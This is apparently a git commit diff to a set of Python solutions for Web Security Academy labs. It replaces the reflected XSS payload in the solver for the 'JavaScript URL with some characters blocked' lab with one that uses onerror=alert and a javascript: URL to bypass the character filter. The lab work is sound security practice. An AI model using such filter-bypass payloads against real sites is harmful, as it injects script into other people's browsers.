e0184d12e04bfc6ef65ef2e0b59500a9e6081e9f
Alvin Nguyen <alvinonguyen00@gmail.com>
2024-04-30 20:01:56 -0700

    Reflected XSS in a JavaScript URL with some characters blocked (Actual solution)

--- web_security_academy/web-security/cross-site-scripting/contexts/lab-javascript-url-some-characters-blocked.py
+++ web_security_academy/web-security/cross-site-scripting/contexts/lab-javascript-url-some-characters-blocked.py
@@ -1,10 +1,8 @@
 from web_security_academy.core.logger import logger
 
 
-# Todo: Find the real solution
 def solve_lab(session):
-    # Solves lab, but doesn't alert(1337)...
-    xss = "',a:valueOf=alert,b:window+'"
+    xss = "',a:onerror=alert,b:window.location='javascript:throw+1337"
     path = f"/post?postId=1&xss={xss}"
     session.get_path(path)
     logger.info(f'Visited path "{path}"')
